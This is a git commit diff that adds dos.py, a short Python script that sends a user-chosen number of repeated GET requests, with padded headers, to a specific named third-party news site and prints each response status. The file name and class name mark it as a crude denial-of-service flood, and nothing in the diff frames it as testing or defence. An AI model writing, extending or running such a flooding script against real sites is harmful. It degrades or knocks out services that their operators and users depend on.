bd4625b254d1a99cbcb0d477f39c38310d960d35
IDerevyansky <iderevyansky@yandex.ru>
2019-09-27 16:45:37 +0300

    ''

--- dos.py
+++ dos.py
@@ -1,17 +1,37 @@
 #-- coding: utf8 --
 #!/usr/bin/env python3
 
-import time, requests
-
-r = requests.get('https://api.github.com/users/IDerevyansky')
+import time, requests, random 
 
 
-if r.status_code == 200 :
-	print('request take')
+
+class dos():
+
+	
+
+	def go(self):
+
+		for x in range(0, self):
+			r = requests.get('https://thepobelka.ru/?page=news&q=JmNhdGVnb3J5PUt2YXJ0aXJhJmlkPTE0Mg==', headers={'Cache-Control': 'max-age=3600', 'Accept-Ranges':'99999', 'Accept-Encoding': 'gzip', 'Content-Length':'1348'})
+	
+			
+			print('----------------------')
+			print('num'+str(x))
+			print( round( time.process_time(),2 ) )
+			print(r.status_code)
+			print('----------------------')
+
+
+
+it = int(input('num iteretion: '))
+
+dos.go(it)
+
 
 
 
 
 # print(str(x)+' work');
 # print(time.process_time())
-	
+
+
